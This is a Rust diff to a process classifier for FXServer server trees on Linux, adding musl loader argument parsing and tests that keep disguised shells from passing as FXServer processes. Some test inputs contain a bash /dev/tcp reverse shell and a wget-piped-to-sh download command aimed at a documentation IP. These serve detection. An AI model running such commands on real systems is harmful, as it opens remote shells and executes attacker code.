@@ -117,24 +117,44 @@ pub fn classify(process: &ProcessInfo, context: &TreeContext) -> ProcessKind {
             ProcessKind::Other
         }
         Flavour::Linux => {
-            let fxserver = is(&context.fxserver);
-            let loaded = context.loader.as_deref().is_some_and(is) && runs_fxserver(args, context);
-            let run_sh = context.run_sh.as_deref().is_some_and(|run_sh| {
-                args.iter()
-                    .skip(1)
-                    .any(|arg| context.same(Path::new(arg), run_sh))
-            }) && image
+            // Where the build's FXServer is named in argv: run as itself, or by the build's loader.
+            let loaded = context
+                .loader
+                .as_deref()
+                .is_some_and(is)
+                .then(|| loaded_program(args))
+                .flatten();
+            let binary = if is(&context.fxserver) {
+                Some(0)
+            } else {
+                loaded.filter(|&at| context.same(Path::new(&args[at]), &context.fxserver))
+            };
+            // A shell running the build's run.sh as its script, before any other argument.
+            let script = (image
                 .and_then(file_name)
-                .is_some_and(|name| name == "sh" || name == "bash");
-            if (fxserver || loaded || run_sh) && has("-dumpserver:") && has("-parentppe:") {
+                .is_some_and(|name| ["sh", "bash", "dash"].contains(&name))
+                && args
+                    .get(1)
+                    .zip(context.run_sh.as_deref())
+                    .is_some_and(|(script, run_sh)| context.same(Path::new(script), run_sh)))
+            .then_some(1);
+            // FXServer's own flags come after the program they are given to.
+            let after = |program: Option<usize>, prefix: &str| {
+                program.is_some_and(|at| args.iter().skip(at + 1).any(|arg| arg.starts_with(prefix)))
+            };
+            if [binary, script]
+                .into_iter()
+                .any(|program| after(program, "-dumpserver:") && after(program, "-parentppe:"))
+            {
                 return ProcessKind::DumpServer;
             }
-            if (fxserver || loaded) && has("--start-node") {
+            if after(binary, "--start-node") {
                 return ProcessKind::Node;
             }
             let names = [
                 image.and_then(file_name),
                 args.first().and_then(|arg| file_name(Path::new(arg))),
+                loaded.and_then(|at| file_name(Path::new(&args[at]))),
             ];
             if names.into_iter().flatten().any(linux_shell) {
                 return ProcessKind::Shell;
@@ -144,12 +164,23 @@ pub fn classify(process: &ProcessInfo, context: &TreeContext) -> ProcessKind {
     }
 }
 
-/// The loader's arguments name the build's FXServer right after `--`.
-fn runs_fxserver(args: &[String], context: &TreeContext) -> bool {
-    args.iter()
-        .skip_while(|arg| *arg != "--")
-        .nth(1)
-        .is_some_and(|program| context.same(Path::new(program), &context.fxserver))
+/// Where the program the musl loader runs is in its argv: the first argument after the loader's
+/// options (`--library-path`, `--preload` and `--argv0`, each with its value, up to a bare `--`).
+/// `None` when the loader runs nothing: `--list`, an option it does not know, or no program.
+fn loaded_program(args: &[String]) -> Option<usize> {
+    let mut at = 1;
+    while let Some(option) = args.get(at).and_then(|arg| arg.strip_prefix("--")) {
+        at += 1;
+        match option {
+            "" => break,
+            "library-path" | "preload" | "argv0" => at += 1,
+            _ if ["library-path=", "preload=", "argv0="]
+                .iter()
+                .any(|with_value| option.starts_with(with_value)) => {}
+            _ => return None,
+        }
+    }
+    (at < args.len()).then_some(at)
 }
 
 fn linux_shell(name: &str) -> bool {
@@ -353,6 +384,18 @@ mod tests {
             ),
             ProcessKind::DumpServer
         );
+        // run.sh started through its `#!/bin/sh` line, where /bin/sh is dash.
+        assert_eq!(
+            classify(
+                &process(
+                    "/usr/bin/dash",
+                    7,
+                    &["/bin/sh", "/srv/fx/run.sh", "-dumpserver:5", "-parentppe:7"]
+                ),
+                &context
+            ),
+            ProcessKind::DumpServer
+        );
         assert_eq!(
             classify(
                 &process(
@@ -364,6 +407,118 @@ mod tests {
             ),
             ProcessKind::Other
         );
+    }
+
+    #[test]
+    fn a_shell_that_names_run_sh_or_fxserver_somewhere_in_its_arguments_is_still_a_shell() {
+        let context = linux();
+        let loader = "/srv/fx/alpine/opt/cfx-server/ld-musl-x86_64.so.1";
+
+        assert_eq!(
+            classify(
+                &process(
+                    "/usr/bin/bash",
+                    7,
+                    &[
+                        "bash",
+                        "-c",
+                        "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
+                        "/srv/fx/run.sh",
+                        "-dumpserver:0",
+                        "-parentppe:1"
+                    ]
+                ),
+                &context
+            ),
+            ProcessKind::Shell
+        );
+        // musl's loader runs its first argument that is not one of its options.
+        assert_eq!(
+            classify(
+                &process(
+                    loader,
+                    7,
+                    &[
+                        loader,
+                        "/srv/fx/alpine/bin/busybox",
+                        "sh",
+                        "-c",
+                        "wget -qO- http://203.0.113.5/x | sh",
+                        "--",
+                        "/srv/fx/alpine/opt/cfx-server/FXServer",
+                        "-dumpserver:0",
+                        "-parentppe:1"
+                    ]
+                ),
+                &context
+            ),
+            ProcessKind::Shell
+        );
+        assert_eq!(
+            classify(
+                &process(
+                    loader,
+                    7,
+                    &[
+                        loader,
+                        "/srv/fx/alpine/bin/busybox",
+                        "sh",
+                        "-c",
+                        "id",
+                        "--",
+                        "/srv/fx/alpine/opt/cfx-server/FXServer",
+                        "--start-node"
+                    ]
+                ),
+                &context
+            ),
+            ProcessKind::Shell
+        );
+        assert_eq!(
+            classify(
+                &process(
+                    loader,
+                    7,
+                    &[
+                        loader,
+                        "/srv/fx/alpine/opt/cfx-server/FXServer",
+                        "--",
+                        "/tmp/x",
+                        "-dumpserver:0"
+                    ]
+                ),
+                &context
+            ),
+            ProcessKind::Other,
+            "FXServer's flags count only when FXServer is given them"
+        );
+    }
+
+    #[test]
+    fn the_loader_s_own_options_are_read_as_musl_reads_them() {
+        let args = |line: &[&str]| line.iter().map(ToString::to_string).collect::<Vec<_>>();
+
+        assert_eq!(
+            loaded_program(&args(&["ld", "--library-path", "/a:/b", "--", "/fx/FXServer"])),
+            Some(4)
+        );
+        assert_eq!(
+            loaded_program(&args(&[
+                "ld",
+                "--preload=/x.so",
+                "--argv0",
+                "FXServer",
+                "/fx/FXServer"
+            ])),
+            Some(4)
+        );
+        assert_eq!(
+            loaded_program(&args(&["ld", "/bin/sh", "--", "/fx/FXServer"])),
+            Some(1)
+        );
+        assert_eq!(loaded_program(&args(&["ld", "--list", "/fx/FXServer"])), None);
+        assert_eq!(loaded_program(&args(&["ld", "--unknown", "/fx/FXServer"])), None);
+        assert_eq!(loaded_program(&args(&["ld", "--library-path"])), None);
     }
 
     #[test]
